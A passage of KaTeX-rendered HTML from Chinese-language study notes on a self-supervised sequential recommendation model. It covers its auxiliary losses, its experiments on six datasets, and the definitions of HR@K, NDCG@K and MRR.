mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>, 与公式<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mrow><mi>M</mi><mi>A</mi><mi>P</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">L_{MAP}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 在特征交互中具有类似效果</li>\n<li>专注于捕捉属性信息与项目 / 序列上下文之间的关联</li>\n<li>主要区别是利用特征交互作为额外的监督信号来增强数据表示，而不是进行预测</li>\n</ul>\n<h4 id=\"顺序模型\"><a class=\"anchor\" href=\"#顺序模型\">#</a> 顺序模型</h4>\n<ul>\n<li>包含一个预训练阶段，利用四种不同类型的自监督学习信号来增强数据表示</li>\n<li>具体来说<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mrow><mi>M</mi><mi>I</mi><mi>P</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">L_{MIP}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 在捕获序列依赖性方面具有比较好的效果，并且还可以利用双向序列信息</li>\n</ul>\n<h4 id=\"属性感知序列模型\"><a class=\"anchor\" href=\"#属性感知序列模型\">#</a> 属性感知序列模型</h4>\n<ul>\n<li>现有方法通过上下文特征来改进序列推荐模型，在这些模型中，这些特征被视为辅助信息，以增强项目或序列的表示</li>\n<li>本模型中 $L_{AAP} <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>损失和</mtext></mrow><annotation encoding=\"application/x-tex\">损失和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">损</span><span class=\"mord cjk_fallback\">失</span><span class=\"mord cjk_fallback\">和</span></span></span></span> L_{MAP}$ 损失旨在将属性与项目或序列上下文融合，这能够达到与以前的方法相同的效果</li>\n<li>此外，预先训练的数据表示也可以应用于改进现有方法</li>\n</ul>\n<h2 id=\"实验-2\"><a class=\"anchor\" href=\"#实验-2\">#</a> 实验</h2>\n<h3 id=\"实验装置\"><a class=\"anchor\" href=\"#实验装置\">#</a> 实验装置</h3>\n<h4 id=\"数据\"><a class=\"anchor\" href=\"#数据\">#</a> 数据</h4>\n<ul>\n<li>对来自四个真实平台的六个数据集进行了实验</li>\n<li>美团 美容 运动 玩具 Yelp  LastFM</li>\n<li>对于所有数据集，我们按用户对交互记录进行分组，并按交互时间戳升序排序，只保留 5 个核心数据集，并过滤掉互动记录少于 5 条的冷门商品和不活跃用户</li>\n<li>将真实项目与 99 个随机抽样的负项目配对，这些负项目是用户未与之交互的。我们根据项目的排名计算所有指标，并报告所有测试用户的平均得分。</li>\n</ul>\n<h4 id=\"评估指标\"><a class=\"anchor\" href=\"#评估指标\">#</a> 评估指标</h4>\n<p><strong>HR@K</strong> 关注的是推荐系统能否在前 K 个推荐项中命中用户实际喜欢的物品。</p>\n<p><strong>NDCG@K</strong> 不仅关注命中，还关注命中的推荐项在推荐列表中的位置，位置越靠前，得分越高。</p>\n<p><strong>MRR</strong> 关注第一个相关项在推荐列表中的排名，排名越靠前，得分越高。</p>\n<h5 id=\"top-k-命中率hrk\"><a class=\"anchor\" href=\"#top-k-命中率hrk\">#</a> Top-K 命中率（HR@K）</h5>\n<p>HR@K 衡量推荐系统在前 K 个推荐项中有多少个是用户实际喜欢的物品。它是一种二元评价指标，要么命中要么未命中。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mrow><mi mathvariant=\"normal\">H</mi><mi mathvariant=\"normal\">R</mi><mi mathvariant=\"normal\">@</mi><mi mathvariant=\"normal\">K</mi></mrow><mo>=</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mfrac><mn>1</mn><mrow><mi mathvariant=\"normal\">∣</mi><mi>U</mi><mi mathvariant=\"normal\">∣</mi></mrow></mfrac><munder><mo>∑</mo><mrow><mi>u</mi><mo>∈</mo><mi>U</mi></mrow></munder><mn mathvariant=\"bold\">1</mn><mtext>(Top-K Recommendations for </mtext><mi>u</mi><mo>∩</mo><mtext>True Items for </mtext><mi>u</mi><mo mathvariant=\"normal\">≠</mo><mi mathvariant=\"normal\">∅</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}&amp;\\mathrm{HR@K}=\\\\&amp;\\frac{1}{|U|}\\sum_{u\\in U}\\mathbf{1}\\text{(Top-K Recommendations for }u\\cap\\text{True Items for }u\\neq\\emptyset)\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.443146em;vertical-align:-1.9715729999999994em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4715730000000002em;\"><span style=\"top:-4.953013em;\"><span class=\"pstrut\" style=\"height:3.32144em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.9715730000000007em;\"><span class=\"pstrut\" style=\"height:3.32144em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9715729999999994em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.4715730000000002em;\"><span style=\"top:-4.953013em;\"><span class=\"pstrut\" style=\"height:3.32144em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathrm\">H</span><span class=\"mord mathrm\">R</span><span class=\"mord mathrm\">@</span><span class=\"mord mathrm\">K</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span><span style=\"top:-2.9715730000000007em;\"><span class=\"pstrut\" style=\"height:3.32144em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.32144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\">∣</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.936em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span><span class=\"mrel mtight\">∈</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">U</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">1</span></span><span class=\"mord text\"><span class=\"mord\">(Top-K Recommendations for </span></span><span class=\"mord mathnormal\">u</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∩</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord text\"><span class=\"mord\">True Items for </span></span><span class=\"mord mathnormal\">u</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\"><span class=\"mord vbox\"><span class=\"thinbox\"><span class=\"rlap\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"inner\"><span class=\"mrel\"></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mrel\">=</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">∅</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9715729999999994em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ul>\n<li><strong>U</strong>: 用户集合。</li>\n<li><strong>Top-K Recommendations</strong>: 推荐系统为用户推荐的前 K 个物品。</li>\n<li><strong>True Items</strong>: 用户实际喜欢的物品。</li>\n<li><strong><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn mathvariant=\"bold\">1</mn><mo stretchy=\"false\">(</mo><mo>⋅</mo><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\mathbf{1}(\\cdot)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">1</span></span><span class=\"mopen\">(</span><span class=\"mord\">⋅</span><span class=\"mclose\">)</span></span></span></span></strong>: 指示函数，如果条件为真，则值为 1，否则为 0。</li>\n</ul>\n<p>HR@K 值越高，说明推荐系统越能够将用户感兴趣的物品排在前 K 名</p>\n<pre><code>##### Top-K 归一化折扣累积增益（NDCG@K）\n</code></pre>\n<p>NDCG@K 衡量推荐系统的推荐结果在前 K 个推荐项中的排序质量。它不仅考虑推荐物品的相关性，还考虑相关物品在推荐列表中的位置。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mrow><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">D</mi><mi mathvariant=\"normal\">C</mi><mi mathvariant=\"normal\">G</mi><mi mathvariant=\"normal\">@</mi><mi mathvariant=\"normal\">K</mi></mrow><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant=\"normal\">∣</mi><mi>U</mi><mi mathvariant=\"normal\">∣</mi></mrow></mfrac><munder><mo>∑</mo><mrow><mi>u</mi><mo>∈</mo><mi>U</mi></mrow></munder><mfrac><mrow><mi>D</mi><mi>C</mi><mi>G</mi><mi mathvariant=\"normal\">@</mi><msub><mi>K</mi><mi>u</mi></msub></mrow><mrow><mi>I</mi><mi>D</mi><mi>C</mi><mi>G</mi><mi mathvariant=\"normal\">@</mi><msub><mi>K</mi><mi>u</mi></msub></mrow></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>其中</mtext><mo separator=\"true\">,</mo><mi>D</mi><mi>C</mi><mi>G</mi><mi mathvariant=\"normal\">@</mi><mi>K</mi><mtext>和</mtext><mi>I</mi><mi>D</mi><mi>C</mi><mi>G</mi><mi mathvariant=\"normal\">@</mi><mi>K</mi><mtext>的计算公式分别为</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>D</mi><mi>C</mi><mi>G</mi><mi mathvariant=\"normal\">@</mi><mi>K</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>K</mi></munderover><mfrac><mrow><msup><mn>2</mn><mrow><mi>r</mi><mi>e</mi><msub><mi>l</mi><mi>i</mi></msub></mrow></msup><mo>−</mo><mn>1</mn></mrow><mrow><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mo stretchy=\"false\">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>I</mi><mi>D</mi><mi>C</mi><mi>G</mi><mi mathvariant=\"normal\">@</mi><mi>K</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi mathvariant=\"normal\">∣</mi><mi>R</mi><mi>E</mi><msub><mi>L</mi><mi>u</mi></msub><mi mathvariant=\"normal\">∣</mi></mrow></munderover><mfrac><mrow><msup><mn>2</mn><mrow><mi>r</mi><mi>e</mi><msub><mi>l</mi><mi>i</mi></msub></mrow></msup><mo>−</mo><mn>1</mn></mrow><mrow><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mo stretchy=\"false\">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></mfrac></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;\\mathrm{NDCG@K}=\\frac{1}{|U|}\\sum_{u\\in U}\\frac{DCG@K_{u}}{IDCG@K_{u}} \\\\\n&amp;其中,DCG@K和IDCG@K的计算公式分别为: \\\\\n&amp;DCG@K=\\sum_{i=1}^{K}\\frac{2^{rel_{i}}-1}{\\log_{2}(i+1)} \\\\\n&amp;IDCG@K=\\sum_{i=1}^{|REL_{u}|}\\frac{2^{rel_{i}}-1}{\\log_{2}(i+1)}\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:11.437825000000004em;vertical-align:-5.468912500000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.968912500000002em;\"><span style=\"top:-8.5584775em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6.096771500000001em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.6084355000000006em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.06976149999999914em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.468912500000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.968912500000002em;\"><span style=\"top:-8.5584775em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">D</span><span class=\"mord mathrm\">C</span><span class=\"mord mathrm\">G</span><span class=\"mord mathrm\">@</span><span class=\"mord mathrm\">K</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.32144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\">∣</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.936em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span><span class=\"mrel mtight\">∈</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">U</span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.37144em;\"><span style=\"top:-2.3139999999999996em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8360000000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span><span style=\"top:-6.096771500000001em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">其</span><span class=\"mord cjk_fallback\">中</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">计</span><span class=\"mord cjk_fallback\">算</span><span class=\"mord cjk_fallback\">公</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">分</span><span class=\"mord cjk_fallback\">别</span><span class=\"mord cjk_fallback\">为</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span><span style=\"top:-3.6084355000000006em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8283360000000002em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3000050000000005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.277669em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.526108em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mop\"><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.20696799999999996em;\"><span style=\"top:-2.4558600000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24414em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal mtight\">e</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.01968em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.936em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span><span style=\"top:-0.06976149999999914em;\"><span class=\"pstrut\" style=\"height:3.961005em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"mspace\" 